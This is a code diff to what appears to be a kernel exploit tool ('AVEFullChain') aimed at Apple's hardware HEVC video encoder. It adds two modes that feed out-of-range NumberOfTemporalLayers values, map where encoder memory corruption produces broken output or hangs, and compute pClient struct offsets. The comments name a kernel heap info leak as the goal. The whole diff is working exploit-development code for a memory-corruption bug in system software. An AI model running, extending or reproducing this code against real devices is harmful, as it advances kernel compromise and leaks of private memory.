@@ -11554,6 +11554,205 @@ vps_cd_done:
             rlog("All survived → crash boundary beyond NTL=%d\n", end);
         rlog("\n=== NTL_DEEP_SCAN complete ===\n");
 
+    } else if (strcmp(mode, "ntl_nal_scan") == 0) {
+        /*
+         * ntl_nal_scan — Map NAL output size across NTL values
+         *
+         * Finds the exact NTL where encoder output transitions from normal
+         * to corrupted (nal=0). The transition point reveals which struct
+         * field controls output generation. Values just below the transition
+         * may produce anomalous output containing kernel heap data (info leak).
+         *
+         * Also measures encode time per frame to detect slowdowns that
+         * indicate the encode path is being affected by corruption.
+         *
+         * Usage: ntl_nal_scan [start] [end] [step]
+         */
+        int start = (argc > 2) ? atoi(argv[2]) : 2;
+        int end = (argc > 3) ? atoi(argv[3]) : 1000;
+        int step = (argc > 4) ? atoi(argv[4]) : 10;
+        if (start < 1) start = 1;
+        if (end < start) end = start + 100;
+        if (step < 1) step = 1;
+        if (end > 65000) end = 65000;
+
+        int vw = 192, vh = 192;
+        rlog("=== NTL_NAL_SCAN: Map output corruption landscape ===\n");
+        rlog("Range: %d to %d, step=%d, res=%dx%d\n", start, end, step, vw, vh);
+        rlog("Encoding 1 frame per NTL, logging NAL size and timing.\n\n");
+
+        int tested = 0;
+        for (int ntl = start; ntl <= end; ntl += step) {
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) { rlog("NTL=%5d: create FAIL\n", ntl); tested++; continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+            OSStatus sp = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+            if (sp != noErr) {
+                rlog("NTL=%5d: set REJECTED\n", ntl);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++; continue;
+            }
+
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (prep != noErr) {
+                rlog("NTL=%5d: prep FAIL=%d\n", ntl, (int)prep);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++; continue;
+            }
+
+            g_encode_done = 0; g_cb_status = -999; g_last_nal_size = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (!pb) {
+                rlog("NTL=%5d: pixbuf FAIL\n", ntl);
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                tested++; continue;
+            }
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *base = CVPixelBufferGetBaseAddress(pb);
+            if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            struct timeval tv_start, tv_end;
+            gettimeofday(&tv_start, NULL);
+            OSStatus enc = VTCompressionSessionEncodeFrame(s, pb,
+                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            int enc_ok = 0;
+            if (enc == noErr) {
+                VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                for (int w = 0; w < 200 && !g_encode_done; w++) usleep(10000);
+                enc_ok = g_encode_done;
+            }
+            gettimeofday(&tv_end, NULL);
+            long ms = (tv_end.tv_sec - tv_start.tv_sec) * 1000 +
+                      (tv_end.tv_usec - tv_start.tv_usec) / 1000;
+
+            CVPixelBufferRelease(pb);
+            rlog("NTL=%5d: nal=%4zu cb=%d enc=%d ms=%ld\n",
+                 ntl, g_last_nal_size, (int)g_cb_status, enc_ok, ms);
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            tested++;
+            usleep(20000);
+        }
+
+        rlog("\n=== NTL_NAL_SCAN complete: tested %d values ===\n", tested);
+
+    } else if (strcmp(mode, "ntl_hang_search") == 0) {
+        /*
+         * ntl_hang_search — Binary search the encode-hang boundary
+         *
+         * Finds the exact NTL where encoding starts hanging (timeout).
+         * Uses a per-encode timeout to detect hangs without blocking.
+         *
+         * The hang boundary reveals a critical encoder config field offset.
+         * Fields corrupted at this boundary control encode-loop termination.
+         *
+         * Usage: ntl_hang_search [low] [high] [timeout_ms]
+         *   low: NTL that works (default: 58000)
+         *   high: NTL that hangs (default: 65000)
+         *   timeout_ms: encode timeout in ms (default: 3000)
+         */
+        int lo = (argc > 2) ? atoi(argv[2]) : 58000;
+        int hi = (argc > 3) ? atoi(argv[3]) : 65000;
+        int timeout_ms = (argc > 4) ? atoi(argv[4]) : 3000;
+        if (lo < 1) lo = 1;
+        if (hi < lo) hi = lo + 1000;
+        if (timeout_ms < 500) timeout_ms = 500;
+        if (timeout_ms > 10000) timeout_ms = 10000;
+
+        int vw = 192, vh = 192;
+        rlog("=== NTL_HANG_SEARCH: Binary search encode-hang boundary ===\n");
+        rlog("Range: %d to %d, timeout=%dms, res=%dx%d\n", lo, hi, timeout_ms, vw, vh);
+        rlog("Looking for NTL where encode hangs (critical config field).\n\n");
+
+        while (hi - lo > 1) {
+            int mid = lo + (hi - lo) / 2;
+            rlog("Testing NTL=%d (range %d-%d): ", mid, lo, hi);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
+                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(es);
+            if (cs != noErr || !s) { rlog("create FAIL\n"); break; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            CFNumberRef ntl_num = CFNumberCreate(NULL, kCFNumberIntType, &mid);
+            VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), ntl_num);
+            CFRelease(ntl_num);
+
+            OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
+            if (prep != noErr) {
+                rlog("prep FAIL\n");
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                hi = mid;
+                continue;
+            }
+
+            g_encode_done = 0; g_last_nal_size = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, vw, vh, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (!pb) {
+                rlog("pixbuf FAIL\n");
+                VTCompressionSessionInvalidate(s); CFRelease(s);
+                break;
+            }
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *base = CVPixelBufferGetBaseAddress(pb);
+            if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            OSStatus enc = VTCompressionSessionEncodeFrame(s, pb,
+                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            int hung = 0;
+            if (enc == noErr) {
+                VTCompressionSessionCompleteFrames(s, kCMTimePositiveInfinity);
+                int wait_iters = timeout_ms / 10;
+                for (int w = 0; w < wait_iters && !g_encode_done; w++) usleep(10000);
+                hung = !g_encode_done;
+            } else {
+                rlog("enc err=%d → ", (int)enc);
+            }
+
+            CVPixelBufferRelease(pb);
+            rlog("nal=%zu %s\n", g_last_nal_size, hung ? "HUNG" : "ok");
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            usleep(100000);
+
+            if (hung) {
+                hi = mid;
+            } else {
+                lo = mid;
+            }
+        }
+
+        rlog("\n=== RESULT: Encode hangs at NTL=%d (last working: %d) ===\n", hi, lo);
+
+        int last_ok_offset_l3 = 0x8098 + (lo - 1) * 4;
+        int first_hang_offset_l3 = 0x8098 + (hi - 1) * 4;
+        rlog("Loop3 corruption: working up to pClient+0x%X, hangs at pClient+0x%X\n",
+             last_ok_offset_l3, first_hang_offset_l3);
+        rlog("Critical config field is at approximately pClient+0x%X to pClient+0x%X\n",
+             last_ok_offset_l3, first_hang_offset_l3);
+        rlog("\n=== NTL_HANG_SEARCH complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
